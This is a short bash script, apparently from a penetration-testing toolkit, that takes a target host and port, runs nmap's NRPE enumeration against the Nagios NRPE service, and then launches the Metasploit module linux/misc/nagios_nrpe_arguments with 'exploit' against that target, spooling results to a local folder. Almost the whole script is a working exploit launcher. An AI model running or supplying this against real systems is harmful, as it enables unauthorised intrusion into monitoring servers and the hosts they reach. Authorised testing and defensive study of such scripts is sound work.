#!/bin/bash

# https://www.exploit-db.com/exploits/32925
host=$1
port=5666
dest_dir="svc_scan_results/${host}/nrpe"
mkdir -p "${dest_dir}"

if [[ ! -z "${2}" ]]; then
	port=$2
fi

echo "Launching NRPE scans on ${host}:${port}"
# must download
nmap -Pn -p${port} --script nrpe-enum "${host}" -oA "${dest_dir}/general_p${port}" &
msfconsole -q -x "spool ${dest_dir}/nrpe_args_msf_p${port};use linux/misc/nagios_nrpe_arguments;set RHOSTS ${host};set RPORT ${port};exploit;exit" &
echo "NRPE scans on ${host}:${port} launched."
exit 0